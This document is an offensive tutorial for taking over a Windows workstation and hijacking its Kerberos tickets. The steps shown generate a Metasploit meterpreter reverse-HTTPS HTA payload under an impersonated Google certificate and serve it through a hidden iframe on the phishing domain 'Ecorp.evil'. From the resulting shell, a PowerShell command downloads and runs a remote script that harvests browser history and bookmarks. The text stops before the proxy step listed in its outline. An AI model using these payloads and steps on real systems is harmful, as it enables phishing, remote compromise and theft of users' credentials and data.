# Hijacking Kerberose Tickets
> Jacking kerberos tickets to remotely access the intranet.
> The noted describe a process that is run from Kali

1. Attacker creates a web page seving a malicous HTA file
2. Target browses the attacker-sent web page & executes the served HTA file
3. Meterpreter session is established
4. Malicous Code Injection
	- A: PowerShell script for recon against browser is injected into the target workstation's memory.
	- B: gssapu-proxy is dropped and executed.  The attacker can connect to port 8080 & browse the intranet, hijacking the target's active Kerberose tickets.


## 1. Malicous HTA File

1. Craft Malicous HTA File

```bash
service postgressql start
msfconsole

# MSF

msf5 use auxilary/gather/impersonate_ssl
msf5 auxilary(mpersonste_ssl)> set RHOST www.google.com
msf5 auxilary(mpersonste_ssl)> run
```

The output of *run* will include a `[+] www.google.com:443 - pem: /location/to/pem.pem`.

```bash
# MSF
msf5 auxilary(mpersonste_ssl)> use payload/windows/meterpreter/reverse_https
msf5 payload(windows/meterpreter/reverse_https)> set LHOST [evil external IP]
msf5 payload(windows/meterpreter/reverse_https)> set LPORT 443
msf5 payload(windows/meterpreter/reverse_https)> set stagerverifysslcert true
msf5 payload(windows/meterpreter/reverse_https)> set HANDLERSSLCERT /location/to/pem.pem
msf5 payload(windows/meterpreter/reverse_https)> generate -f hta-psh -o /tmp/patch.hta  #See Note Below
msf5 payload(windows/meterpreter/reverse_https)> back
msf5 use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
msf5 exploit(multi/handler) > set LHOST [external OR internal IP depending on the setup]
msf5 exploit(multi/handler) > set LPORT 443
msf5 exploit(multi/handler) > set stagerverifysslcert  true
msf5 exploit(multi/handler) > set HANDLERSSLCERT /location/to/pem.pem
msf5 exploit(multi/handler) > set exitonsession false
msf5 exploit(multi/handler) > exploit -j
```

**generate** Note: This could throw an error depending on the version of MSF you are using.
Older versions of msf use slightly different option flags.  Check the options for your version.

This may work instead: `generate -t hta-psh -f /tmp/patch.hta`

The `-t` was for output format but in `msf5>` it is `-f`

The `-f` was for output filename but in `msf5>` it is `-o`


## 2. HTA File is Executed
**[+] Simple HTML page** to serve the HTA file just created.  Name it whatever but for here it will be refered to as `index.html`.

*Auto Execute* will only take place in IE and Edge browsers.

```html
<html>
<head>
<body>
<div style="display:none;">
	<iframe id="frmDld" src:"http://Ecorp.evil/patch.hta"></iframe>
</div>
</body>
</head>
</html>
```

1. Serve `index.html` via any means, but the below works just fine.  
```python
python -m SimpleHTTPServer 8080
```
2. Send the victim a link or some phish.
3. Victim goes to `http://Ecorp.evil/index.html` cause they aren't paying attention to the domain name.
4. When `index.html` loads IF browser is IE or Edge it will execute the `patch.hta` file, and if everthing was set up properly, connect back to the `msf` session.  Check `jobs` and `sessions` to see if it worked.
5. [maybe] The victim may need to allow the file to execute.  But why not? They cliked on a **`Ecorp.evil`** link, right?


## 3. Meterpreter Session

Now you should have a meterperter session.  If not, what did you do wrong? Seriously.... I laid everything out for you.

Interact with the session: `sessions -i 1`
Start a Shell: `shell`


## 4. Malicous Code Injection

To enumerate browser history & bookmarks, inject `Get-BrowserData` into the victim's memory.

Execute the following in the `shell` session started in #3 above.

```powershell
C:\Users\FrankCastle\> powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Get-BrowserData.ps1'); Get-BrowserData | Format-List"
```